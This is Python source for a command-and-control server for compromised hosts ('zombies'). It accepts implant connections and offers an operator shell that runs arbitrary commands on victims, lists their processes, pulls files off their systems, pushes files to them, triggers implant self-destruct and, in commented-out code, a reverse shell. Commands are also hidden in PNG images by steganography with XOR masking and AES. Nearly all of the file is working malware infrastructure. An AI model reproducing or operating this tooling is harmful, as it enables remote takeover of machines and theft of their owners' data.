import socket
import subprocess
from tqdm import tqdm
import time
import threading
import os
from colorama import Fore, Back, Style
import numpy as np
from PIL import Image
from Crypto.Cipher import AES
import hashlib

def derive_key(password):
    return hashlib.sha256(password.encode()).digest()

def pad(data):
    pad_len = 16 - len(data) % 16
    return data + bytes([pad_len] * pad_len)

def unpad(data):
    pad_len = data[-1]
    return data[:-pad_len]

def encrypt(data, key):
    if isinstance(data, str):
        data = data.encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data))
    return cipher.iv + ciphertext

def decrypt(enc_data, key):
    iv = enc_data[:16]
    ciphertext = enc_data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext))
    return plaintext.decode('utf-8')

#################################


exit_event = threading.Event()

counter=-1
clientlist=[]
clientdata=[]
# automigrate=""

host = "0.0.0.0"
port = 4545
key = 'abcd'
password = "abcd"
aes_key = derive_key(password)

#################

def startrevshellsvr():
    if os.name == 'nt': #we usin' windows, well...then do this
        subprocess.call(["py", "pyrevshell_server.py"])
        exit_event.set()

def init_main_sock(s):
    while True:
        conn, addr = s.accept()
        print(Fore.GREEN, f'\n[*] Accepted new connection from: {addr[0]}:{addr[1]} !!!', Fore.WHITE)
        # client_sock_handle = conn.fileno()
        # print(f"Client socket handle: {client_sock_handle}")
        # global automigrate 
        global counter
        counter+=1 
        clientinfo = conn.recv(1024).decode('UTF-8').split("\n")

        UserInfo=clientinfo[0]
        clientlist.append([counter, conn, UserInfo])
        clientdata.append(clientinfo)
        
        # Start probe thread (to check if client get disconnected)
        handler_thread = threading.Thread(target=probe)
        handler_thread.daemon = True
        handler_thread.start()

def probe():
    while True:
        global counter
        global clientlist
        global clientdata
       
        try:
            d = 0
            for c in range(len(clientlist)):
                clientlist[c][1].send(b"?keepalive?\n")
                d = d + 1
        except:
            print(Fore.YELLOW + "\nThis Zombie died:\n************************\n" + Fore.WHITE, counter, "--> ", clientdata[d], "\n************************\n")
            clientlist.pop(d)
            clientdata.pop(d)
            counter = counter - 1
            print(Fore.GREEN + "[+] removed \"dead\" zombie ;) " + Fore.WHITE)
        time.sleep(4)

def server_selection():
    global clientlist
    commands="True"
    
    while not "exit" in commands:
        command=input(Fore.YELLOW + "<< 404 >> $ " + Fore.WHITE)

        match(command):
            case "":
                pass
            # Interact with a zombie/agent!            
            case "zombies":
                zombies()

            # Clear
            case "clear" | "cls":
                if os.name == 'nt':
                    os.system("cls")
                else:
                    os.system("clear")
            
            # Help
            case "help" | "?":
                print(Fore.YELLOW + "commands:\n$ zombies\n$ clear/cls (clears screen)\n$ control + C kills server\n" + Fore.WHITE)

            case _:
                print("Unknown command. Please type help for more info!")

def zombies():
    global counter
    global clientlist
    global clientdata
    selection=""
    
    # No zombies
    if (len(clientlist)) <= 0:
        print(Fore.RED + "[!] no zombies yet..." + Fore.WHITE)
        return
        
    print(Fore.GREEN + "Zombies: ", len(clientlist), Fore.WHITE)

    # List zombies
    temp=0
    for b in clientdata:
        print("Zombie: ", temp, "-->", b)
        temp+=1
    print(Fore.GREEN + "\nPick a zombie to interact with!\n" + Fore.WHITE)

    # Select zombies
    try:
        selection=int(input(' <enter the client #> $ '))
    except:
        print(Fore.RED + "[!] enter client number..." + Fore.WHITE)
        time.sleep(2)
        return 
    
    # Main zombies CLI
    while True:
        """
        --> you can uncomment if you want, but I like the commands showing on screen
        if os.name == 'nt':
            os.system("cls")
        else:
            os.system("clear")
        """
        # Command
        choice=input(Fore.YELLOW + "[C2-Shell]:~$ " + Fore.WHITE)
        match(choice):
            # Clear
            case "cls" | "clear":
                if os.name == 'nt':
                    os.system("cls")
                else:
                    os.system("clear")

            # Help
            case "help" | "?":
                print(Fore.GREEN)
                print("Commands\n==================")
                print("msg: Send a Message")
                print("userinfo: Get user info")
                print("execute: Enter a command to be executed!")
                print("kill: Kill Zombie")
                print("procs: list all processes & their respective users (run as admin for best results)")
                print("shell: Start a Shell!")
                print("whoami: Whoami")
                print("send: Send a file")
                print("recv: Receive a file")
                print("return: Main menu")
                print(Fore.WHITE)
                input()
        
            # msg - check connection with zombies
            case "msg":
                try:
                    # clientlist[selection][1].send(b":msg:\nhey from the server!\n")
                    send_command(clientlist[selection][1], ":msg:\nhey from the server!\n", "original/cover.png")
                    print(Fore.GREEN + "[+] Message Sent!" + Fore.WHITE)
                    time.sleep(2)
                except:
                    print(Fore.RED + "[!] there was an error sending the msg to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                    time.sleep(2)

            # Get file from system
            case "recv":
                # Get filename
                print("Enter the filepath + filename you want to download, ex: c:/temp/file.txt")
                file_path=input(":").strip()
                filename = file_path.rsplit("/", 1)[-1] 
                print(filename)

                # Send command to zombies
                clientlist[selection][1].send(f"~download~{file_path}~\n".encode())

                # Get reply from zombies
                reply = clientlist[selection][1].recv(1024).decode()
                if "error" in reply:
                    print("No such file in system")
                    continue

                # Get file size
                filesize=int(clientlist[selection][1].recv(1024).decode())

                # Start download
                download_location = f"./{filename}"
                with open(download_location, 'wb') as f:
                    received = 0
                    while received < filesize:
                        data = clientlist[selection][1].recv(4096)
                        if not data:
                            break
                        if not "?keepalive?" in data.decode("UTF-8", errors="ignore"):
                            f.write(data)
                            received += len(data)
                print("[+] File successfully downloaded!\n")
        
            case "send":
                # Get filename
                file_path = input("Enter the path of the file to upload: ").strip()
                if not os.path.isfile(file_path):
                    print(f"Error: File '{file_path}' does not exist.")
                    continue

                # Check filename
                filename = os.path.basename(file_path)
                filesize = os.path.getsize(file_path)
                print('filename: ' + filename)
                print('filesize: ' + str(filesize))

                # Get client response
                clientlist[selection][1].send(f":upload:{filename}:{filesize}:\n".encode())
                cresponse=clientlist[selection][1].recv(1024)
                print(cresponse.decode('UTF-8'))
                time.sleep(3)
                
                # Send file
                with open(file_path, 'rb') as f, tqdm(total=filesize, unit="B", unit_scale=True, desc=f"Uploading {filename}") as pbar:
                    for chunk in iter(lambda: f.read(4096), b''):
                        clientlist[selection][1].sendall(chunk)
                        pbar.update(len(chunk))
                
                # Receive client done
                cresponse2=clientlist[selection][1].recv(1024)
                print(cresponse2.decode('UTF-8'))
                time.sleep(3)
            
            # Print info of zombies
            case "userinfo":
                for a in clientdata[selection]:
                    print(a)
                input()

            # Print all process in zombies system
            # Execute the given command
            case "execute" | "procs":
                try:
                    # Get command
                    if choice == "execute":
                        print("Enter your command you would like to execute on the agent below")
                        thecommand=input(":")
                    
                    # procs
                    else: 
                        thecommand = "ps -ef"
                        
                        # For window
                        # thecommand="for /f \"tokens=1,2,7,8,9\" %A in ('tasklist /NH /V') do @echo %A %B %C %D %E"

                    # Send command
                    clientlist[selection][1].send(f"c0mm@nd\n{thecommand}\n".encode('utf-8'))
                    print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)

                    # Receive and print out output
                    while True:
                        data2=clientlist[selection][1].recv(1024)
                    
                        if not data2 or ":endofoutput:" in data2.decode():
                            endoutput=data2.decode()
                            endoutput = endoutput.replace(":endofoutput:", "")
                            print(endoutput, end='')
                            break
                        print(data2.decode(), end='')
                    input("[+] DONE! Press any key to return...")

                # error
                except:
                    print(Fore.RED + "[+] Either reached end of output for receiving socket or..." + Fore.WHITE)
                    print(Fore.RED + "[!] there was an error sending the command to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                    time.sleep(2)
            case "kill":
                try:
                    # Send self-destruct task
                    clientlist[selection][1].send(b"self-destruct\n")
                    print(Fore.GREEN + "[+] zombie self-destruct succeeded!" + Fore.WHITE)
                    time.sleep(2)
                except:
                    print(Fore.RED + "[!] There was an issue communicating with the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                    time.sleep(2)

            # case "shell":
            #     exit_event.clear()
                
            #     handler_thread = threading.Thread(target=startrevshellsvr)
            #     handler_thread.daemon = True
            #     handler_thread.start()
                
            #     print("[+] starting shell in 2 seconds!")
            #     time.sleep(2)
                
            #     clientlist[selection][1].send(b":shell:\n")
            #     while not exit_event.is_set():
            #         time.sleep(1)
            #     return

            case "whoami":
                # Send whoami
                clientlist[selection][1].send(b":whoami:\n")
                
                # receive whoami output
                whoami=clientlist[selection][1].recv(1024).decode('UTF-8')
                print("You are: ", whoami)
                time.sleep(2)

            case "return":
                return
            
            case _:
                pass


def send_command(client, msg, image):
    encrypted_msg = encrypt(msg, aes_key)
    client.sendall(encrypted_msg)
    masked_msg = xor_mask(msg, key)
    encode_msg(masked_msg, input = image, output = image)

    filename = os.path.basename(image)
    filesize = os.path.getsize(image)
    print('filename: ' + filename)
    print('filesize: ' + str(filesize))

    # Get client response
    client.send(f":upload:{filename}:{filesize}:\n".encode())
    cresponse=client.recv(1024)
    print(cresponse.decode('UTF-8'))
    time.sleep(3)
    
    # Send file
    with open(image, 'rb') as f, tqdm(total=filesize, unit="B", unit_scale=True, desc=f"Uploading {filename}") as pbar:
        for chunk in iter(lambda: f.read(4096), b''):
            client.sendall(chunk)
            pbar.update(len(chunk))
    
    # Receive client done
    cresponse2=client.recv(1024)
    print(cresponse2.decode('UTF-8'))
    time.sleep(3)

def encode_msg(msg, input="cover.png", output="cover_secret.png"):
    # Process message
    # b_msg = ''.join(["{:08b}".format(ord(x)) for x in msg ])
    # b_msg = [int(x) for x in b_msg]
    # b_msg_length = len(b_msg)
    b_msg = [format(byte, '08b') for byte in msg]
    b_msg = [int(bit) for byte in b_msg for bit in byte]
    b_msg_length = len(b_msg)

    # Open image
    with Image.open(input) as img:
        width, height = img.size
        data = np.array(img)
        
    # Modify last bit
    data = np.reshape(data, width*height*3)
    data[:b_msg_length] = data[:b_msg_length] & 0 | b_msg
    data = np.reshape(data, (height, width, 3))

    # Save encoded image
    new_img = Image.fromarray(data)
    new_img.save(output)

def xor_mask(data, key):
    # Encode data and key to byte
    data = data.encode('utf-8')    
    key = key.encode('utf-8')

    # Extend key if not equal to data
    if len(key) < len(data):
        key = (key * (len(data) // len(key) + 1))[:len(data)]

    # Perform XOR masking
    masked_data = bytes([d ^ k for d, k in zip(data, key)])
    
    return masked_data


#################

def main():
    # Open socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(5)
    print(Fore.YELLOW + "[+] listening on port "+str(port), Fore.WHITE)

    # Thread to accepting new client (implant)
    handler_thread = threading.Thread(target=init_main_sock, args=(s, ))
    handler_thread.daemon = True
    handler_thread.start()

    # Thread to handle command line (tasking, status, ...)
    handler_thread = threading.Thread(target=server_selection)
    handler_thread.daemon = True
    handler_thread.start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
